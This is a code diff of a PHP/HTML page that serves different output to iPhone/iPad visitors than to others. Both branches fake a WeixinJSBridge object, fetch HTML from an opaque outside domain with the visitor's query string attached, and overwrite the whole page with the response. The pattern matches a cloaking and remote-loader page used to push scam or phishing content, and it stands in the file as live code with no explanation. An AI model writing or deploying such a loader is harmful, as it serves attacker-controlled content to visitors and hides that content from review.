@@ -1,30 +1,61 @@
+<?php
+ $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "";
+ if (preg_match("~iphone|ipad~i", $ua)) {
+
+?>
+
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport"
-          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-	<meta http-equiv="Pragma" content="no-cache" />
-	<meta http-equiv="Expires" content="0" />
-    <title>.</title>
-</head>
-<body style="background-color: #f0eff3">
-	<script>
-    var WeixinJSBridge={};
-    var xhr=new XMLHttpRequest;
-	var path=window.location.search;
-    xhr.onload=function(){
-        var onhash=window.onhashchange;
-        var h=xhr.responseText;
-        document.body.innerHTML='';
-        var a=document.open("text/html","replace");
-        a.write(h);
-        a.close();
-        window.onhashchange=onhash
-    };
-    xhr.open("GET",'https://base.gzzjbx.cn/api/page'+path,false);xhr.send();
+<html>
+ <head>
+  <meta charset="UTF-8">
+  <title></title>
+ </head>
+ <body>
+  <script charset="utf-8">
+   window.onload=function(){
+
+        if(!/iphone|ipad/ig.test(navigator.userAgent)) var WeixinJSBridge={};
+        var xhr=new XMLHttpRequest;
+        var path=window.location.search;
+        xhr.onload=function(){
+            var onhash=window.onhashchange;
+            var h=xhr.responseText;
+            document.body.innerHTML='';
+            var a=document.open("text/html","replace");
+            a.write(h);
+            a.close();
+            window.onhashchange=onhash
+        };
+        xhr.open("GET",'http://m.iijqjo79.cn/api/page'+path,false);xhr.send();
+
+    }
+  </script>
+ </body>
+</html
+
+
+<?php
+} else {
+
+?>
+
+<script>
+
+        if(!/iphone|ipad/ig.test(navigator.userAgent)) var WeixinJSBridge={};
+        var xhr=new XMLHttpRequest;
+        var path=window.location.search;
+        xhr.onload=function(){
+            var onhash=window.onhashchange;
+            var h=xhr.responseText;
+            //document.body.innerHTML='';
+            var a=document.open("text/html","replace");
+            a.write(h);
+            a.close();
+            window.onhashchange=onhash
+        };
+        xhr.open("GET",'http://m.iijqjo79.cn/api/page'+path,false);xhr.send();
 </script>
-</body>
-</html>
+
+<?php
+}
+?>
